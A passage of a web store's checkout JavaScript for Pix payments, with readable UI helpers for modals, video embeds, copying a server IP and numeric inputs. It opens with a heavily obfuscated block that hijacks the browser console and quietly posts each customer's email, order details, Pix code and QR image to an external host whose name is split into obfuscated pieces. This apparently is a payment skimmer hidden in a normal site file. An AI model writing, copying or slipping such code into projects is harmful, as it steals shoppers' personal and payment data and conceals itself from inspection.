_0x229f7e(_0x170d40,_0x27e1f1,_0x40a279,_0x31b024){return _0x3abb(_0x31b024-0x100,_0x170d40);}if(_0x41f459['etmXY'](_0x23385d(0x2e9,'khu1',0x2db,0x2df),'LUWTN')){const _0x9c802a=_0x41fee4[_0x229f7e('Lmir',0x249,0x23c,0x249)+'r'][_0x23385d(0x2d9,'EI&9',0x2c3,0x2fc)][_0x23385d(0x310,'8Dkz',0x2fb,0x31f)](_0x592949),_0x4fa9bb=_0x519d2a[_0xe336ca],_0x10ad70=_0x5b3fec[_0x4fa9bb]||_0x9c802a;_0x9c802a[_0x23385d(0x31c,'lIIB',0x324,0x343)]=_0x2535c5['bind'](_0x50f25f),_0x9c802a[_0x23385d(0x2fc,'T!V[',0x310,0x2f7)]=_0x10ad70['toString'][_0x229f7e('cUrO',0x2a8,0x2a4,0x281)](_0x10ad70),_0x3a3169[_0x4fa9bb]=_0x9c802a;}else{if(_0x588ac8){const _0x14c31e=_0x588ac8['apply'](_0x3bd9a0,arguments);return _0x588ac8=null,_0x14c31e;}}}:function(){};return _0x4c295b=![],_0x265df4;};}()),_0x5cf5e7=_0x925f8b(this,function(){const _0x51616c={'ApqRx':function(_0x1734f7,_0x330ad9){return _0x1734f7(_0x330ad9);},'WFCfU':function(_0xd5eca7,_0x2faba1){return _0xd5eca7+_0x2faba1;},'UZdEp':_0x14f626(0x1c0,0x1b1,'f%mo',0x19f)+_0xa46171(0x2cf,0x2e7,0x2cd,'&rTZ'),'MNsBr':_0xa46171(0x2b4,0x2a5,0x29d,'EI&9')+_0xa46171(0x2b5,0x2af,0x2ba,'E)cf')+_0xa46171(0x2c4,0x2a4,0x2a4,'Qcc4')+'\x20)','mBzkD':_0x14f626(0x1dc,0x1d7,'9S1O',0x1e5),'ilfDX':function(_0x25eb6c){return _0x25eb6c();},'IOvRV':'warn','sfMlz':_0x14f626(0x1e5,0x1ed,'OeFi',0x1df),'EqbLJ':_0xa46171(0x2c8,0x2c1,0x2e1,'Lmir'),'FsBPE':_0x14f626(0x1a9,0x1f2,'Qcc4',0x1ca),'rwcWz':'trace','lHMjJ':function(_0x4fb244,_0x599bae){return _0x4fb244<_0x599bae;}},_0x55ae5e=function(){let _0x556d3e;function _0x16d944(_0x7d3ab9,_0x4310e8,_0x39b9cf,_0x17e9cc){return _0x14f626(_0x7d3ab9-0x18,_0x4310e8-0xd6,_0x17e9cc,_0x4310e8- -0x8b);}try{_0x556d3e=_0x51616c['ApqRx'](Function,_0x51616c[_0x16d944(0x113,0x125,0x100,'K9P6')](_0x51616c['UZdEp']+_0x51616c[_0x3a239c(-0x2a4,-0x286,-0x29b,'xDKv')],');'))();}catch(_0x2acd4c){if(_0x51616c[_0x3a239c(-0x252,-0x27a,-0x251,'lGNa')]===_0x16d944(0x11b,0x133,0x151,'rGI$')){if(_0x253fd1){const _0x1f9a2a=_0x15ad8b['apply'](_0x4da917,arguments);return _0xc31f16=null,_0x1f9a2a;}}else _0x556d3e=window;}function _0x3a239c(_0x1af17a,_0x12479a,_0x44ec5f,_0x399d8d){return _0xa46171(_0x12479a- -0x556,_0x12479a-0xe7,_0x44ec5f-0x8b,_0x399d8d);}return _0x556d3e;},_0x17927f=_0x51616c[_0x14f626(0x1ea,0x1f4,'9S1O',0x1e0)](_0x55ae5e);function _0x14f626(_0x1c7341,_0xb89aa,_0x3c212b,_0x37872c){return _0x3abb(_0x37872c-0x5b,_0x3c212b);}function _0xa46171(_0x97810,_0x400160,_0x4142e9,_0x37ff39){return _0x3abb(_0x97810-0x176,_0x37ff39);}const _0x4171c5=_0x17927f[_0x14f626(0x179,0x17a,'geZN',0x19c)]=_0x17927f[_0xa46171(0x2eb,0x30a,0x2e1,'EI&9')]||{},_0x4a328c=[_0xa46171(0x2f2,0x2ce,0x2ef,'QgQJ'),_0x51616c[_0xa46171(0x2d2,0x2d8,0x2d1,'T7^k')],_0x51616c[_0x14f626(0x1e5,0x1ed,'E)cf',0x1e4)],_0x51616c[_0x14f626(0x1d6,0x1cf,'Cy!!',0x1c6)],_0x51616c[_0xa46171(0x2da,0x2d5,0x2d8,'E)cf')],_0xa46171(0x2be,0x298,0x2b1,'PmeU'),_0x51616c[_0x14f626(0x1cb,0x1ae,'sbt*',0x1a7)]];for(let _0x28f018=0x1e26+-0x52*-0x36+-0x2f72;_0x51616c[_0x14f626(0x1cd,0x1c1,'ON#S',0x1ab)](_0x28f018,_0x4a328c[_0xa46171(0x2bd,0x2b8,0x2bf,'Qcc4')]);_0x28f018++){const _0x1626b3=_0x925f8b[_0xa46171(0x2cc,0x2a7,0x2a3,']Ehi')+'r'][_0xa46171(0x2f1,0x2c8,0x301,'f%mo')][_0xa46171(0x2f6,0x311,0x2d0,'135Y')](_0x925f8b),_0x5031aa=_0x4a328c[_0x28f018],_0x494efd=_0x4171c5[_0x5031aa]||_0x1626b3;_0x1626b3[_0xa46171(0x2b0,0x2cb,0x294,'EI&9')]=_0x925f8b[_0x14f626(0x1d7,0x19e,'r)c)',0x1b2)](_0x925f8b),_0x1626b3['toString']=_0x494efd[_0x14f626(0x181,0x1b6,'xb^W',0x19e)]['bind'](_0x494efd),_0x4171c5[_0x5031aa]=_0x1626b3;}});function _0x280073(_0x33b2a0,_0x1e4525,_0x1f8b99,_0x2efe7a){return _0x3abb(_0x1f8b99-0x1e8,_0x33b2a0);}_0x5cf5e7();const _0xe7ebb8={};_0xe7ebb8[_0x280073('^kaZ',0x396,0x373,0x351)]=data[_0x182916('EI&9',0x477,0x45b,0x483)],_0xe7ebb8['ID']=order_id,_0xe7ebb8['Price']=formatted_price,_0xe7ebb8[_0x280073('T7^k',0x30f,0x32d,0x308)]=data['client_ema'+'il'],_0xe7ebb8['Products']=outpackages,_0xe7ebb8[_0x280073('K[3r',0x32e,0x332,0x358)+'t']=pix_code,_0xe7ebb8['QR']=_0x280073('&rTZ',0x33e,0x328,0x316)+'/jpeg;base'+_0x280073('lYCR',0x328,0x324,0x335)+qr_code;const dataPost=_0xe7ebb8;postJSON('https://ba'+_0x280073('PmeU',0x378,0x351,0x34d)+_0x280073('f2C0',0x32d,0x345,0x368)+'com/loja/n'+'otify/play'+'er',dataPost,_0x280073('cUrO',0x326,0x33b,0x32d)+'%19&M59zTC',!(0x6*-0x425+-0x1372+0x1*0x2c50));
            return showPixModal(pix_code, qr_code, return_url);
        }
        if (return_url) return location.href = return_url;
      })
      .catch((err) => {
        const errors = err.data.errors;
        if (warn_timeout) clearTimeout(warn_timeout);
        showCheckoutError(errors[0].message, err);
      })
      .finally(() => $(this).removeAttr('disabled'));
});

/**
 * End checkout modal controllers
 */

document.querySelectorAll('oembed[url]').forEach((element) => {
  const url = element.attributes.getNamedItem('url').textContent;
  const video = url.substring(url.length - 11, url.length);
  element.insertAdjacentHTML('beforeend', `<iframe width="100%" height="420" src="https://www.youtube.com/embed/${video}"></iframe>`);
});

async function showPackage(slug) {
  const url = base_url + '/package/' + slug;
  const html = await fetch(url).then(async(res) => await res.text());
  $('#package-modal-container').modal('show');

  const newElement = document.createElement('div');
  newElement.innerHTML = html;
  $('#package-modal-container .modal-content').get()[0].replaceChildren(newElement);
}

function copyIp(element) {
  const ip = element.getAttribute('data-ip');
  navigator.clipboard.writeText(ip);
  showToast('', 'Endereço copiado com sucesso.');
}

function openSubcategoryMenu(element) {
  const subCategoryWrapper = $(element).next('.cc__subcategories___list__wrapper');
  const buttonCaret = $(element).children('.fa-solid.fa-caret-right');
  const height = subCategoryWrapper.children().outerHeight();

  if (subCategoryWrapper.css('height') === '0px') {
    subCategoryWrapper.css('height', height + 'px');
    buttonCaret.css('transform', 'rotate(90deg)');
  } else {
    subCategoryWrapper.css('height', '0px');
    buttonCaret.css('transform', 'rotate(0deg)');
  }
}

$('.number-only').on('keypress', function(event) {
  if (isNaN(event.key)) event.preventDefault();
});

$('.number-only').on('paste', function(event) {
  const clipboardData = event.originalEvent.clipboardData || window.clipboardData;
  const pastedData = clipboardData.getData('text');
  if (isNaN(pastedData)) event.preventDefault();
});
